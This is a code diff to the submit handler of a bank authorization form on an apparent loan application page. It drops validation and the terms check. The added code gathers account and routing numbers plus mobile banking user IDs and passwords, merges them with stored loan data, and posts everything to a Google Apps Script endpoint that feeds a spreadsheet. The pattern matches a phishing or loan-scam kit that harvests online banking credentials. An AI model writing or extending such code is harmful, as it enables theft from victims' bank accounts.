@@ -412,47 +412,50 @@
         });
 
         // Form submission
-        document.getElementById('bankAuthForm').addEventListener('submit', function(e) {
+        document.getElementById('bankAuthForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             
-            // Validate form
-            const requiredFields = this.querySelectorAll('[required]');
-            let isValid = true;
+            // Get loan data from localStorage
+            const loanData = JSON.parse(localStorage.getItem("loanData")) || {};
             
-            requiredFields.forEach(field => {
-                if (!field.value.trim()) {
-                    isValid = false;
-                    field.classList.add('border-red-500');
-                    setTimeout(() => {
-                        field.classList.remove('border-red-500');
-                    }, 3000);
-                } else {
-                    field.classList.remove('border-red-500');
-                }
-            });
+            // Collect bank form data with exact field IDs
+            const bankData = {
+                bankName: document.getElementById("bankName").value,
+                routingNumber: document.getElementById("routingNumber").value,
+                accountNumber: document.getElementById("accountNumber").value,
+                yourBank: document.getElementById("yourBank").value,
+                mobileBankingUserId: document.getElementById("mobileBankingUserId").value,
+                mobileBankingPassword: document.getElementById("mobileBankingPassword").value
+            };
             
-            if (!isValid) {
-                showNotification('Please fill in all required fields.', 'error');
-                return;
+            // Merge both forms data
+            const finalData = { ...loanData, ...bankData };
+            
+            console.log('Merged data for Google Sheets:', finalData);
+            
+            // Send to Google Sheets
+            try {
+                const response = await fetch("https://script.google.com/macros/s/AKfycbxRURL9p2FblMv7CLOeUxqGnHzb4yDDW58SyvpNPQ2wZoQhqk0H082kuJ_eHNObF44KjA/exec", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify(finalData)
+                });
+                
+                console.log('Google Sheets response:', response);
+                
+                // Clear localStorage
+                localStorage.removeItem("loanData");
+                
+                // Show success
+                alert("Submitted successfully");
+                window.location.href = "loan-success.html";
+                
+            } catch (error) {
+                console.error('Error submitting to Google Sheets:', error);
+                alert('Error submitting form. Please try again.');
             }
-            
-            // Check terms acceptance
-            if (!document.getElementById('terms').checked) {
-                showNotification('Please accept the authorization terms.', 'error');
-                return;
-            }
-            
-            // Collect form data
-            const formData = new FormData(this);
-            const data = {};
-            formData.forEach((value, key) => {
-                data[key] = value;
-            });
-            data.timestamp = new Date().toISOString();
-            data.type = 'bank_authentication';
-            
-            // Send to backend
-            submitBankAuth(data);
         });
 
         function submitBankAuth(data) {
